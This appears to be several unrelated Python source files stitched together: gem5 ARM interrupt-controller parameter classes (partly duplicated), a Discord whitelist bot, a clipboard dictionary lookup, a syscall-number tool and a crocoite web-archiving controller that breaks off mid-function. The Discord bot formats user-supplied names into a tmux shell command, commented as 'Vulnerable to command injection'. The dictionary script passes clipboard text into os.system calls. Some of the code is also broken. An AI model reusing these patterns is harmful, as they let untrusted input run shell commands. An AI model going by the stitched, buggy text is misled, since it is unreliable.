    dist_pio_delay = Param.Latency('10ns', "Delay for PIO r/w to distributor")
    redist_addr = Param.Addr("Address for redistributors")
    redist_pio_delay = Param.Latency('10ns',
            "Delay for PIO r/w to redistributors")
    it_lines = Param.UInt32(1020,
            "Number of interrupt lines supported (max = 1020)")

    maint_int = Param.ArmInterruptPin(
        "HV maintenance interrupt."
        "ARM strongly recommends that maintenance interrupts "
        "are configured to use INTID 25 (PPI Interrupt).")

    cpu_max = Param.Unsigned(256,
        "Maximum number of PE. This is affecting the maximum number of "
        "redistributors")

    gicv4 = Param.Bool(True, "GICv4 extension available")

# Copyright (c) 2012-2013, 2017-2018 ARM Limited
# All rights reserved.
#
# The license below extends only to copyright in the software and shall
# not be construed as granting a license to any other intellectual
# property including but not limited to intellectual property relating
# to a hardware implementation of the functionality of the software
# licensed hereunder.  You may use the software subject to the license
# terms below provided that you ensure that this notice is replicated
# unmodified and in its entirety in all distributions of the software,
# modified or unmodified, in source code or in binary form.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are
# met: redistributions of source code must retain the above copyright
# notice, this list of conditions and the following disclaimer;
# redistributions in binary form must reproduce the above copyright
# notice, this list of conditions and the following disclaimer in the
# documentation and/or other materials provided with the distribution;
# neither the name of the copyright holders nor the names of its
# contributors may be used to endorse or promote products derived from
# this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
# LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
# Authors: Andreas Sandberg

from m5.params import *
from m5.proxy import *
from m5.util.fdthelper import *
from m5.SimObject import SimObject

from m5.objects.Device import PioDevice                    
from m5.objects.Platform import Platform

class BaseGic(PioDevice):
    type = 'BaseGic'
    abstract = True
    cxx_header = "dev/arm/base_gic.hh"

    platform = Param.Platform(Parent.any, "Platform this device is part of.")

    gicd_iidr = Param.UInt32(0,
        "Distributor Implementer Identification Register")
    gicd_pidr = Param.UInt32(0,
        "Peripheral Identification Register")
    gicc_iidr = Param.UInt32(0,
        "CPU Interface Identification Register")
    gicv_iidr = Param.UInt32(0,
        "VM CPU Interface Identification Register")

class ArmInterruptPin(SimObject):
    type = 'ArmInterruptPin'
    cxx_header = "dev/arm/base_gic.hh"
    cxx_class = "ArmInterruptPinGen"
    abstract = True

    platform = Param.Platform(Parent.any, "Platform with interrupt controller")
    num = Param.UInt32("Interrupt number in GIC")

class ArmSPI(ArmInterruptPin):
    type = 'ArmSPI'
    cxx_header = "dev/arm/base_gic.hh"
    cxx_class = "ArmSPIGen"

class ArmPPI(ArmInterruptPin):
    type = 'ArmPPI'
    cxx_header = "dev/arm/base_gic.hh"
    cxx_class = "ArmPPIGen"

class GicV2(BaseGic):
    type = 'GicV2'
    cxx_header = "dev/arm/gic_v2.hh"

    dist_addr = Param.Addr("Address for distributor")
    cpu_addr = Param.Addr("Address for cpu")
    cpu_size = Param.Addr(0x2000, "Size of cpu register bank")
    dist_pio_delay = Param.Latency('10ns', "Delay for PIO r/w to distributor")
    cpu_pio_delay = Param.Latency('10ns', "Delay for PIO r/w to cpu interface")
    int_latency = Param.Latency('10ns', "Delay for interrupt to get to CPU")
    it_lines = Param.UInt32(128, "Number of interrupt lines supported (max = 1020)")
    gem5_extensions = Param.Bool(False, "Enable gem5 extensions")

class Gic400(GicV2):
    """
    As defined in:
    "ARM Generic Interrupt Controller Architecture" version 2.0
    "CoreLink GIC-400 Generic Interrupt Controller" revision r0p1
    """
    gicd_pidr = 0x002bb490
    gicd_iidr = 0x0200143B
    gicc_iidr = 0x0202143B

    # gicv_iidr same as gicc_idr
    gicv_iidr = gicc_iidr

class Gicv2mFrame(SimObject):
    type = 'Gicv2mFrame'
    cxx_header = "dev/arm/gic_v2m.hh"
    spi_base = Param.UInt32(0x0, "Frame SPI base number");
    spi_len = Param.UInt32(0x0, "Frame SPI total number");
    addr = Param.Addr("Address for frame PIO")

class Gicv2m(PioDevice):
    type = 'Gicv2m'
    cxx_header = "dev/arm/gic_v2m.hh"

    pio_delay = Param.Latency('10ns', "Delay for PIO r/w")
    gic = Param.BaseGic(Parent.any, "Gic on which to trigger interrupts")
    frames = VectorParam.Gicv2mFrame([], "Power of two number of frames")

class VGic(PioDevice):
    type = 'VGic'
    cxx_header = "dev/arm/vgic.hh"
    gic = Param.BaseGic(Parent.any, "Gic to use for interrupting")
    platform = Param.Platform(Parent.any, "Platform this device is part of.")
    vcpu_addr = Param.Addr(0, "Address for vcpu interfaces")
    hv_addr = Param.Addr(0, "Address for hv control")
    pio_delay = Param.Latency('10ns', "Delay for PIO r/w")
   # The number of list registers is not currently configurable at runtime.
    maint_int = Param.UInt32("HV maintenance interrupt number")

    # gicv_iidr same as gicc_idr
    gicv_iidr = Param.UInt32(Self.gic.gicc_iidr,
        "VM CPU Interface Identification Register")

    def generateDeviceTree(self, state):
        gic = self.gic.unproxy(self)

        node = FdtNode("interrupt-controller")
        node.appendCompatible(["gem5,gic", "arm,cortex-a15-gic",
                               "arm,cortex-a9-gic"])
        node.append(FdtPropertyWords("#interrupt-cells", [3]))
        node.append(FdtPropertyWords("#address-cells", [0]))
        node.append(FdtProperty("interrupt-controller"))

        regs = (
            state.addrCells(gic.dist_addr) +
            state.sizeCells(0x1000) +
            state.addrCells(gic.cpu_addr) +
            state.sizeCells(0x1000) +
            state.addrCells(self.hv_addr) +
            state.sizeCells(0x2000) +
            state.addrCells(self.vcpu_addr) +
            state.sizeCells(0x2000) )

        node.append(FdtPropertyWords("reg", regs))
        node.append(FdtPropertyWords("interrupts",
                                     [1, int(self.maint_int)-16, 0xf04]))

        node.appendPhandle(gic)

        yield node

class Gicv3(BaseGic):
    type = 'Gicv3'
    cxx_header = "dev/arm/gic_v3.hh"

    dist_addr = Param.Addr("Address for distributor")
    dist_pio_delay = Param.Latency('10ns', "Delay for PIO r/w to distributor")
    redist_addr = Param.Addr("Address for redistributors")
    redist_pio_delay = Param.Latency('10ns',
            "Delay for PIO r/w to redistributors")
    it_lines = Param.UInt32(1020,
            "Number of interrupt lines supported (max = 1020)")

    maint_int = Param.ArmInterruptPin(
        "HV maintenance interrupt."
        "ARM strongly recommends that maintenance interrupts "
        "are configured to use INTID 25 (PPI Interrupt).")

    cpu_max = Param.Unsigned(256,
        "Maximum number of PE. This is affecting the maximum number of "
        "redistributors")

    gicv4 = Param.Bool(True, "GICv4 extension available")

#!/bin/python3
import discord
from argparse import ArgumentParser
from configparser import ConfigParser
from subprocess import call

##### Define some constants ############################################################################################

DISCORD_PREFIX = '[Discord] '
COMMAND_PREFIX = '#gatekeep'
WHITELIST_COMMAND_TEMPLATE = 'tmux send-keys -t "0:0" Enter "whitelist add {}" Enter'  # Vulnerable to command injection

##### Read in our ID and secret from config ############################################################################

config = ConfigParser()
config_path = 'config.ini'
config.read(config_path)

if not config.sections():
    print('No existing config was found')
    print('Copy the following blank template into ' + config_path + ' and fill in the blanks:')
    print('[Discord]\n' +
          'client_id = \n' +
          'client_secret = \n' +
          'bot_token = \n' +
          'bot_owner = \n' +
          'bot_server = \n')
    exit(1)

if 'Discord' not in config:
    print('Failed to read config: \'Discord\' section missing')
    exit(1)
if 'client_id' not in config['Discord']:
    print('Failed to read config: \'client_id\' missing from section \'Discord\'')
    exit(1)
if 'bot_token' not in config['Discord']:
    print('Failed to read config: \'bot_token\' missing from section \'Discord\'')
    exit(1)
# if 'bot_owner' not in config['Discord']:
#     print('Failed to read config: \'bot_owner\' missing from section \'Discord\'')
#     exit(1)
if 'bot_server' not in config['Discord']:
    print('Failed to read config: \'bot_server\' missing from section \'Discord\'')
    exit(1)

discord_id = config['Discord']['client_id']
discord_bot_token = config['Discord']['bot_token']
discord_bot_server = config['Discord']['bot_server']
try:
    discord_bot_owner = config['Discord']['bot_owner']
except KeyError:
    discord_bot_owner = ''

##### Parse arguments ##################################################################################################

parser = ArgumentParser()
args = parser.parse_args()

##### Define some functions ############################################################################################

def whitelist(users: str):                    
    for user in users.split():
        call(WHITELIST_COMMAND_TEMPLATE.format(user))                    

##### Set up the Discord bot ###########################################################################################

bot = discord.Client()

@bot.event
async def on_ready():
    print(DISCORD_PREFIX + 'Bot logged in!')

@bot.event
async def on_message(message):
    # Declare this globally here, since we use it early on, /and/ in a command
    #global discord_bot_channel

    # Make sure this is from the desired server
    if str(message.guild.id) != discord_bot_server:
        # print(DISCORD_PREFIX + 'Got a message from server {} channel {}, expected server {}'.format(message.guild.id, message.channel.id, discord_bot_server))
        return

    # If the bot owner is set, make sure this is from them
    if discord_bot_owner and str(message.author.id) not in discord_bot_owner:
        # print(DISCORD_PREFIX + 'Got a message from user {}, expected user {}'.format(message.author.id, discord_bot_owner))
        return

    # Determine what prefix was used to address us, if any
    prefix = ''
    if message.content.startswith(COMMAND_PREFIX):
        prefix = COMMAND_PREFIX
    elif message.content.startswith('<@' + str(discord_id) + '>'):
        prefix = '@{}#{}'.format(bot.user.name, bot.user.discriminator)
    else:
        # We weren't addressed, we can stop here
        return

    # Define a help function
    async def help():
        message.channel.send('Command list:\n' +
                             '\n' +
                             '`help` - Shows this help text\n' +
                             '`whitelist` - Add user(s) to the whitelist')

    # Split the command into arguments
    args = message.content.strip().split()[1:]

    # Return a message if no args are provided
    if not args:
        await message.channel.send('Usage: `{} whitelist <username> [username...]`'.format(prefix), delete_after=30)
    else:
        # Filter what command came through
        if args[0] == 'help':
            await help()

        elif args[0] == 'whitelist':
            if len(args) < 1:
                await help()
            else:
                await whitelist(' '.join(args[1:]))


    # Delete the command
    await message.delete()

##### Start the Discord bot ############################################################################################

bot.run(discord_bot_token)

#! /usr/bin/python3

import requests,json,sys,os,pyperclip,re

def cleanhtml(raw_html):
    cleanr = re.compile('<.*?>')
    cleantext = re.sub(cleanr, '', raw_html)
    return cleantext

word = "test"

def main():
    global word
    print("Starting script... press 'ctrl+c' in terminal to turn off")
    while True:
        if pyperclip.paste() != word and len(pyperclip.paste().split())<5:
            word = pyperclip.paste()
            wordChc=False
            req = requests.get("https://api-portal.dictionary.com/dcom/pageData/%s" % word)
            wordChcURB = False
            reqURB=requests.get('https://api.urbandictionary.com/v0/define?term=%s' % word)
            try:    
                data = json.loads(req.text)['data']['content'][0]['entries'][0]['posBlocks'][0]['definitions']
            except TypeError:
                os.system('notify-send "Cant find |%s| on dictionary.com!"' % word)                    
                wordChc = True
            except KeyError:
                os.system('notify-send "Cant find |%s| on dictionary.com!"' % word)                    
                wordChc = True

            if not wordChc:
                definitions = []
                try:
                    for definition in data[:3]:
                        definitions.append(cleanhtml(definition['definition']))
                        definitions.append("------------")
                    os.system('notify-send "definitions from dictionary.com:[{}\n{}"'\                    
                    .format(word+"]\n------------",'\n'.join(definitions)))                    
                except KeyError:
                    os.system('notify-send "no results in dictionary.com"')
            try:    
                dataURB = json.loads(reqURB.text)['list']
            except TypeError:
                os.system('notify-send "Cant find |%s| on urbandictionary.com!"' % word)                    
                wordChcURB = True
            except KeyError:
                os.system('notify-send "Cant find |%s| on urbandictionary.com!"' % word)                    
                wordChcURB = True

            if not wordChcURB:    
                definitionsURB = []
                for definition in dataURB[:3]:
                    definitionsURB.append(definition['definition'])
                    definitionsURB.append("------------")
                os.system('notify-send "definitions from urbandictionary.com:[{}\n{}"'\                    
                .format(word+"]\n------------",'\n'.join(definitionsURB)))                    
    os.system('notify-send "Thank you for using define.py made by kelj0"')


if __name__ == '__main__':
    main()

#!/usr/bin/env python3

# pylint: disable=line-too-long
# pylint: disable=missing-docstring
# flake8: max-line-length = 120


import json
import os
import pathlib
import re
import shlex
import subprocess
import sys

from collections import OrderedDict
from operator import itemgetter

import click


CONFIG = {
    "syscall_header_file": "/usr/include/bits/syscall.h",
    "cache_file_32bit": "{}/.cache/syscall_number/32bit.json".format(os.environ["HOME"]),
    "cache_file_64bit": "{}/.cache/syscall_number/64bit.json".format(os.environ["HOME"]),
}


BITNESS_32 = "32"
BITNESS_64 = "64"


def read_file_content(file_path):
    try:
        return pathlib.Path(file_path).read_text()
    except (FileNotFoundError, UnicodeDecodeError):
        raise RuntimeError("Error(s) reading from file {}".format(file_path))


def write_file_content(file_path, data):
    try:
        return pathlib.Path(file_path).write_text(data)
    except (FileNotFoundError, UnicodeDecodeError):
        raise RuntimeError("Error(s) writing to file {}".format(file_path))


def parse_syscall_names():
    syscall_names = []

    syscall_name_regex = re.compile(r"^.+SYS_(?P<syscall_name>[^ ]+)")

    try:
        content = read_file_content(CONFIG["syscall_header_file"])
    except RuntimeError as error:
        raise error

    for line in content.split("\n"):
        match = syscall_name_regex.match(line)

        if match:
            syscall_names.append(match.group("syscall_name"))

    return syscall_names


def check_program(program_name):
    try:
        output = subprocess.check_output("which {}".format(program_name).split(), shell=False)
    except OSError:
        output = ""

    return output != ""


def check_sane_integer(syscall_number):
    try:
        syscall_integer = int(syscall_number)

        if not 0 <= syscall_integer <= 999:
            return False

    except ValueError:
        return False

    return True


def get_syscall_number(syscall_name, bitness):
    if bitness == BITNESS_32:
        cflags = "-m32"
    else:
        cflags = ""

    gcc_process = subprocess.Popen(shlex.split("gcc {} -E -".format(cflags)), stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    gcc_process.stdin.write(b"#include <sys/syscall.h>\nSYS_%s" % syscall_name.encode())
    stdout, _ = gcc_process.communicate()

    syscall_number_string = stdout.split(b"\n")[-2].decode()

    if not check_sane_integer(syscall_number_string):
        return -1

    return int(syscall_number_string)


def generate_syscalls(syscall_names, bitness):
    syscalls = {}

    for syscall_name in syscall_names:
        syscalls[syscall_name] = get_syscall_number(syscall_name, bitness)

    return OrderedDict(sorted(syscalls.items(), key=itemgetter(1)))


def cache_files_exist():
    return pathlib.Path(CONFIG["cache_file_32bit"]).exists() and pathlib.Path(CONFIG["cache_file_64bit"]).exists()


def check_cache():
    if cache_files_exist():
        syscalls_32bit = json.loads(read_file_content(CONFIG["cache_file_32bit"]))
        syscalls_64bit = json.loads(read_file_content(CONFIG["cache_file_64bit"]))
    else:
        syscall_names = parse_syscall_names()
        syscalls_32bit = generate_syscalls(syscall_names, BITNESS_32)
        syscalls_64bit = generate_syscalls(syscall_names, BITNESS_64)
        write_file_content(CONFIG["cache_file_32bit"], json.dumps(syscalls_32bit))
        write_file_content(CONFIG["cache_file_64bit"], json.dumps(syscalls_64bit))

    return syscalls_32bit, syscalls_64bit


def print_all_syscalls(syscalls):
    for syscall_name, syscall_number in syscalls.items():
        if syscall_number == -1:  # filter out n/a syscall numbers
            continue

        print("{0:3} (0x{0:X}): {1}".format(syscall_number, syscall_name))


def print_single_syscall(syscall_name, syscalls, quiet):
    if syscall_name not in syscalls.keys():                    
        raise ValueError("The syscall name you provided is not available!")                    

    if quiet:
        print(syscalls[syscall_name])
    else:
        print("The syscall number for {0} is: {1} (0x{1:X})".format(
            syscall_name,
            syscalls[syscall_name],
        ))


def check_cache_directory():
    directory = "{}/.cache/syscall_number".format(os.environ["HOME"])

    if not pathlib.Path(directory).exists():
        os.mkdir(directory)


def check_syscall_header_file():
    if not pathlib.Path(CONFIG["syscall_header_file"]).exists():
        raise RuntimeError("Install gcc with 32bit support: https://github.com/martinclauss/syscall_number#gcc-with-32bit-support")


def print_man_page_info(syscall_name):
    man_environment_variables = {
        "MANPAGER": "cat",
        "COLUMNS": "80"
    }

    command = "man 2 {}".format(syscall_name)
    process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, env=man_environment_variables)
    stdout, _ = process.communicate()

    stdout = stdout.decode()
    information_regex = re.compile(r"(NAME(.|\n)+)\n\nDESCRIPTION")

    match = information_regex.search(stdout)

    if match:
        man_text = "\n"
        man_text += match.group(1)
        man_text += "\n\n...for more details run \"{}\"".format(command)
    else:
        man_text = "no man page info available"

    print(man_text)


@click.command()
@click.option("-s", "--syscall-name", "syscall_name", help="The name of the syscall you want the number for.")
@click.option("-b", "--bitness",
              required=True, type=click.Choice([BITNESS_32, BITNESS_64]), help="Bitness, for example, 32 or 64")
@click.option("-a", "--all", "all_syscalls",
              is_flag=True, help="Print the whole system call table for the current machine.")
@click.option("-q", "--quiet", is_flag=True, help="Just output the number in decimal without any additional text.")
@click.option("-m", "--man-page", "man_page", is_flag=True, help="Print a part of the man page for the queried system call.")
def main(syscall_name, bitness, all_syscalls, quiet, man_page):
    try:
        if not check_program("gcc"):
            raise RuntimeError("This script needs gcc to be installed!")

        check_cache_directory()
        check_syscall_header_file()

        syscalls_32bit, syscalls_64bit = check_cache()

        if bitness == BITNESS_32:
            syscalls = syscalls_32bit
        else:
            syscalls = syscalls_64bit

        if all_syscalls:
            print_all_syscalls(syscalls)
        else:
            print_single_syscall(syscall_name, syscalls, quiet)

            if man_page:
                print_man_page_info(syscall_name)

    except (ValueError, RuntimeError) as error:
        print(str(error))
        sys.exit(1)

    sys.exit(0)


if __name__ == "__main__":
    # pylint: disable=no-value-for-parameter
    main()

# Copyright (c) 2017–2018 crocoite contributors
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

"""
Controller classes, handling actions required for archival
"""

import time, tempfile, asyncio, json, os, shutil, signal
from itertools import islice
from datetime import datetime
from operator import attrgetter
from abc import ABC, abstractmethod
from yarl import URL

from . import behavior as cbehavior
from .browser import SiteLoader, RequestResponsePair, PageIdle, FrameNavigated
from .util import getFormattedViewportMetrics, getSoftwareInfo
from .behavior import ExtractLinksEvent

class ControllerSettings:
    __slots__ = ('idleTimeout', 'timeout', 'insecure')                    

    def __init__ (self, idleTimeout=2, timeout=10, insecure=False):                    
        self.idleTimeout = idleTimeout
        self.timeout = timeout
        self.insecure = insecure

    def toDict (self):                    
        return dict (
                idleTimeout=self.idleTimeout,                    
                timeout=self.timeout,                    
                insecure=self.insecure,                    
                )

defaultSettings = ControllerSettings ()

class EventHandler (ABC):
    """ Abstract base class for event handler """

    __slots__ = ()

    @abstractmethod
    async def push (self, item):
        raise NotImplementedError ()

class StatsHandler (EventHandler):
    __slots__ = ('stats', )

    def __init__ (self):
        self.stats = {'requests': 0, 'finished': 0, 'failed': 0, 'bytesRcv': 0}

    async def push (self, item):
        if isinstance (item, RequestResponsePair):
            self.stats['requests'] += 1
            if not item.response:
                self.stats['failed'] += 1
            else:
                self.stats['finished'] += 1
                self.stats['bytesRcv'] += item.response.bytesReceived

class LogHandler (EventHandler):
    """ Handle items by logging information about them """

    __slots__ = ('logger', )

    def __init__ (self, logger):
        self.logger = logger.bind (context=type (self).__name__)

    async def push (self, item):
        if isinstance (item, ExtractLinksEvent):
            # limit number of links per message, so json blob won’t get too big
            it = iter (item.links)
            limit = 100
            while True:
                limitlinks = list (islice (it, 0, limit))
                if not limitlinks:
                    break
                self.logger.info ('extracted links', context=type (item).__name__,
                        uuid='8ee5e9c9-1130-4c5c-88ff-718508546e0c', links=limitlinks)


class ControllerStart:
    __slots__ = ('payload', )

    def __init__ (self, payload):
        self.payload = payload

class IdleStateTracker (EventHandler):
    """ Track SiteLoader’s idle state by listening to PageIdle events """

    __slots__ = ('_idle', '_loop', '_idleSince')

    def __init__ (self, loop):
        self._idle = True
        self._loop = loop

        self._idleSince = self._loop.time ()

    async def push (self, item):
        if isinstance (item, PageIdle):
            self._idle = bool (item)
            if self._idle:
                self._idleSince = self._loop.time ()

    async def wait (self, timeout):
        """ Wait until page has been idle for at least timeout seconds. If the
        page has been idle before calling this function it may return
        immediately. """

        assert timeout > 0
        while True:
            if self._idle:
                now = self._loop.time ()
                sleep = timeout-(now-self._idleSince)
                if sleep <= 0:
                    break
            else:
                # not idle, check again after timeout expires
                sleep = timeout
            await asyncio.sleep (sleep)

class InjectBehaviorOnload (EventHandler):
    """ Control behavior script injection based on frame navigation messages.
    When a page is reloaded (for whatever reason), the scripts need to be
    reinjected. """

    __slots__ = ('controller', '_loaded')

    def __init__ (self, controller):
        self.controller = controller
        self._loaded = False

    async def push (self, item):
        if isinstance (item, FrameNavigated):
            await self._runon ('load')
            self._loaded = True

    async def stop (self):
        if self._loaded:
            await self._runon ('stop')

    async def finish (self):
        if self._loaded:
            await self._runon ('finish')

    async def _runon (self, method):
        controller = self.controller
        for b in controller._enabledBehavior:
            f = getattr (b, 'on' + method)
            async for item in f ():
                await controller.processItem (item)

class SinglePageController:
    """
    Archive a single page url.

    Dispatches between producer (site loader and behavior scripts) and consumer
    (stats, warc writer).
    """

    __slots__ = ('url', 'service', 'behavior', 'settings', 'logger', 'handler',
            'warcinfo', '_enabledBehavior')

    def __init__ (self, url, logger, \
            service, behavior=cbehavior.available, \
            settings=defaultSettings, handler=None, \
            warcinfo=None):
        self.url = url
        self.service = service
        self.behavior = behavior
        self.settings = settings
        self.logger = logger.bind (context=type (self).__name__, url=url)
        self.handler = handler or []
        self.warcinfo = warcinfo

    async def processItem (self, item):
        for h in self.handler:
            await h.push (item)

    async def run (self):
        logger = self.logger
        async def processQueue ():
            async for item in l:
                await self.processItem (item)

        idle = IdleStateTracker (asyncio.get_event_loop ())
        self.handler.append (idle)
        behavior = InjectBehaviorOnload (self)
        self.handler.append (behavior)

        async with self.service as browser, SiteLoader (browser, logger=logger) as l:
            handle = asyncio.ensure_future (processQueue ())
            timeoutProc = asyncio.ensure_future (asyncio.sleep (self.settings.timeout))

            # configure browser
            tab = l.tab
            await tab.Security.setIgnoreCertificateErrors (ignore=self.settings.insecure)

            # not all behavior scripts are allowed for every URL, filter them
            self._enabledBehavior = list (filter (lambda x: self.url in x,
                    map (lambda x: x (l, logger), self.behavior)))

            version = await tab.Browser.getVersion ()
            payload = {
                    'software': getSoftwareInfo (),
                    'browser': {
                        'product': version['product'],
                        'useragent': version['userAgent'],
                        'viewport': await getFormattedViewportMetrics (tab),
                        },
                    'tool': 'crocoite-single', # not the name of the cli utility
                    'parameters': {
                        'url': self.url,
                        'idleTimeout': self.settings.idleTimeout,
                        'timeout': self.settings.timeout,
                        'behavior': list (map (attrgetter('name'), self._enabledBehavior)),
                        'insecure': self.settings.insecure,
                        },
                    }
            if self.warcinfo:
                payload['extra'] = self.warcinfo
            await self.processItem (ControllerStart (payload))

            await l.navigate (self.url)

            idleProc = asyncio.ensure_future (idle.wait (self.settings.idleTimeout))
            while True:
                try:
                    finished, pending = await asyncio.wait([idleProc, timeoutProc, handle],
                            return_when=asyncio.FIRST_COMPLETED)
                except asyncio.CancelledError:
                    idleProc.cancel ()
                    timeoutProc.cancel ()
                    break

                if handle in finished:
                    # something went wrong while processing the data
                    logger.error ('fetch failed',
                        uuid='43a0686a-a3a9-4214-9acd-43f6976f8ff3')
                    idleProc.cancel ()
                    timeoutProc.cancel ()
                    handle.result ()
                    assert False # previous line should always raise Exception
                elif timeoutProc in finished:
                    # global timeout
                    logger.debug ('global timeout',
                            uuid='2f858adc-9448-4ace-94b4-7cd1484c0728')
                    idleProc.cancel ()
                    timeoutProc.result ()
                    break
                elif idleProc in finished:
                    # idle timeout
                    logger.debug ('idle timeout',
                            uuid='90702590-94c4-44ef-9b37-02a16de444c3')
                    idleProc.result ()
                    timeoutProc.cancel ()
                    break

            await behavior.stop ()
            await tab.Page.stopLoading ()
            await asyncio.sleep (1)
            await behavior.finish ()

            # wait until loads from behavior scripts are done and browser is
            # idle for at least 1 second
            try:
                await asyncio.wait_for (idle.wait (1), timeout=1)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                pass

            if handle.done ():
                handle.result ()
            else:
                handle.cancel ()

class SetEntry:
    """ A object, to be used with sets, that compares equality only on its
    primary property. """
    def __init__ (self, value, **props):
        self.value = value
        for k, v in props.items ():
            setattr (self, k, v)

    def __eq__ (self, b):
        assert isinstance (b, SetEntry)
        return self.value == b.value

    def __hash__ (self):
        return hash (self.value)

    def __repr__ (self):
        return f'<SetEntry {self.value!r}>'

class RecursionPolicy:
    """ Abstract recursion policy """

    __slots__ = ()

    def __call__ (self, urls):
        raise NotImplementedError

class DepthLimit (RecursionPolicy):
    """
    Limit recursion by depth.
    
    depth==0 means no recursion, depth==1 is the page and outgoing links
    """

    __slots__ = ('maxdepth', )

    def __init__ (self, maxdepth=0):
        self.maxdepth = maxdepth

    def __call__ (self, urls):
        newurls = set ()
        for u in urls:
            if u.depth <= self.maxdepth:
                newurls.add (u)
        return newurls

    def __repr__ (self):
        return f'<DepthLimit {self.maxdepth}>'

class PrefixLimit (RecursionPolicy):
    """
    Limit recursion by prefix
    
    i.e. prefix=http://example.com/foo
    ignored: http://example.com/bar http://offsite.example/foo
    accepted: http://example.com/foobar http://example.com/foo/bar
    """

    __slots__ = ('prefix', )

    def __init__ (self, prefix):
        self.prefix = prefix

    def __call__ (self, urls):
        return set (filter (lambda u: str(u.value).startswith (str (self.prefix)), urls))

def hasTemplate (s):
    """ Return True if string s has string templates """
    return '{' in s and '}' in s

class RecursiveController:
    """
    Simple recursive controller

    Visits links acording to policy
    """

    __slots__ = ('url', 'output', 'command', 'logger', 'policy', 'have',
            'pending', 'stats', 'tempdir', 'running', 'concurrency',
            'copyLock')

    SCHEME_WHITELIST = {'http', 'https'}

    def __init__ (self, url, output, command, logger,
            tempdir=None, policy=DepthLimit (0), concurrency=1):
        self.url = url
        self.output = output
        self.command = command
        self.logger = logger.bind (context=type(self).__name__, seedurl=url)
        self.policy = policy
        self.tempdir = tempdir
        # A lock if only a single output file (no template) is requested
        self.copyLock = None if hasTemplate (output) else asyncio.Lock ()
        # some sanity checks. XXX move to argparse?
        if self.copyLock and os.path.exists (self.output):
                raise ValueError ('Output file exists')
        # tasks currently running
        self.running = set ()
        # max number of tasks running
        self.concurrency = concurrency
        # keep in sync with StatsHandler
        self.stats = {'requests': 0, 'finished': 0, 'failed': 0, 'bytesRcv': 0, 'crashed': 0, 'ignored': 0}

    async def fetch (self, entry, seqnum):
        """
        Fetch a single URL using an external command

        command is usually crocoite-single
        """

        assert isinstance (entry, SetEntry)

        url = entry.value
        depth = entry.depth
        logger = self.logger.bind (url=url)

        def formatCommand (e):
            # provide means to disable variable expansion
            if e.startswith ('!'):
                return e[1:]
            else:
                return e.format (url=url, dest=dest.name)

        def formatOutput (p):
            return p.format (host=url.host,
                    date=datetime.utcnow ().isoformat (), seqnum=seqnum)

        def logStats ():
            logger.info ('stats', uuid='24d92d16-770e-4088-b769-4020e127a7ff', **self.stats)

        if url.scheme not in self.SCHEME_WHITELIST:
            self.stats['ignored'] += 1
            logStats ()
            self.logger.warning ('scheme not whitelisted', url=url,
                    uuid='57e838de-4494-4316-ae98-cd3a2ebf541b')
            return

        dest = tempfile.NamedTemporaryFile (dir=self.tempdir,
                prefix=__package__, suffix='.warc.gz', delete=False)
        command = list (map (formatCommand, self.command))
        logger.info ('fetch', uuid='d1288fbe-8bae-42c8-af8c-f2fa8b41794f',
                command=command)
        try:
            process = await asyncio.create_subprocess_exec (*command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.DEVNULL,
                    stdin=asyncio.subprocess.DEVNULL,
                    start_new_session=True, limit=100*1024*1024)
            while True:
                data = await process.stdout.readline ()
                if not data:
                    break
                data = json.loads (data)
                uuid = data.get ('uuid')
                if uuid == '8ee5e9c9-1130-4c5c-88ff-718508546e0c':
                    links = set (self.policy (map (lambda x: SetEntry (URL(x).with_fragment(None), depth=depth+1), data.get ('links', []))))
                    links.difference_update (self.have)
                    self.pending.update (links)
                elif uuid == '24d92d16-770e-4088-b769-4020e127a7ff':
                    for k in self.stats.keys ():
                        self.stats[k] += data.get (k, 0)
                    logStats ()
        except asyncio.CancelledError:
            # graceful cancellation
            process.send_signal (signal.SIGINT)
        except Exception as e:
            process.kill ()
            raise e
        finally:
            code = await process.wait()
            if code == 0:
                if self.copyLock is None:
                    # atomically move once finished
                    lastDestpath = None
                    while True:
                        # XXX: must generate a new name every time, otherwise
                        # this loop never terminates
                        destpath = formatOutput (self.output)
                        assert destpath != lastDestpath
                        lastDestpath = destpath

                        # python does not have rename(…, …, RENAME_NOREPLACE),
                        # but this is safe nontheless, since we’re
                        # single-threaded
